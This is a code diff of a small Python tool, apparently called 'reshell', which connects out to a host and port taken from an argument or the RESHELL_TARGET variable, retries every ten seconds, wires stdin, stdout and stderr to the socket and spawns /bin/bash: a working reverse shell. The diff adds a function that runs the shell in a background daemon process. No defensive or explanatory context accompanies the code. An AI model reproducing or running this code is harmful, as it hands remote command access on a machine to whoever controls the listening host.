@@ -5,16 +5,17 @@ import sys
 import pty
 import time
 import socket
+from multiprocessing import Process
 
 
 __version__ = '1.0.2'
 
 
-def connect_to_target():
-    if len(sys.argv) == 2:
-        target = sys.argv[1]
-    else:
-        target = os.environ["RESHELL_TARGET"]
+def start_daemon(target):
+    Process(target=run_bash, args=(target,), daemon=True).start()
+
+
+def connect_to_target(target):
     host, port = target.split(':')
     port = int(port)
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -27,12 +28,20 @@ def connect_to_target():
                 time.sleep(10)
 
 
-def main():
-    sock = connect_to_target()
+def run_bash(target):
+    sock = connect_to_target(target)
     if sock:
         for channel in (0, 1, 2):
             os.dup2(sock.fileno(), channel)
         pty.spawn("/bin/bash")
+
+
+def main():
+    if len(sys.argv) == 2:
+        target = sys.argv[1]
+    else:
+        target = os.environ["RESHELL_TARGET"]
+    run_bash(target)
 
 
 if __name__ == '__main__':
